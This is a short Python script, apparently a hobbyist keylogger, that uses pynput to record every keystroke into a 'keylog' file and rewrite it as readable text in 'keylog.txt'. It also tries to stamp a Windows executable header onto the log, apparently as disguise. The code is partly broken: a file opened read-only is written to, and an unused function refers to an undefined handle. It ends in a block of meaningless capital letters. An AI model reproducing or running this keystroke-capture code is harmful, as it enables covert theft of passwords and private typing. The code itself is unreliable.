from pynput.keyboard import Key, Listener
import logging



def xdon_press(key):
  k = '{0}'.format(key)
  if k[0] == '\'':
    k = k[1:-1]
  elif k == 'Key.space':
    k = ' '
  elif k == 'Key.enter':
    k = '\n'
  else:
    k = '[%s]\n'
   
  if key == Key.esc:
    # Stop listener
    return False

  f.write(k)
  print(k) 


def on_press(key):	
  try: logging.info(key.char) # letters, numbers etc
  except: logging.info(key.name) # other keys
  f = open('keylog', 'r', encoding='latin-1')
  tmp = f.read().split()
  f.close()
  res = ''
  for i in tmp:
    if i == 'space':
      i = ' '
    elif i == 'enter':
      i = '\n'
    elif len(i) > 1:
      i = '[%s]\n'%i
    res = '%s%s'%(res, i)
  print(res)
  f = open('keylog.txt', 'w')
  f.write(res)
  f.close()
  if key == Key.esc:
    # Stop listener
    return False
  
header = b'\x4D\x5A\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00\xB8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

f = open('keylog', 'rb')
f.write(header)
f.close()

logging.basicConfig(filename='keylog', level=logging.DEBUG, format='%(message)s')



# Collect events until released 
with Listener(on_press=on_press,) as listener:
  listener.join()
  

  

'''
 RKGNRKGNKLN JEBFEJKB JEFBEBFEB
 WKF
 DSKLSDBG
 IGHS  HEBFESF NGSEH
 
 EOGEI
 
'''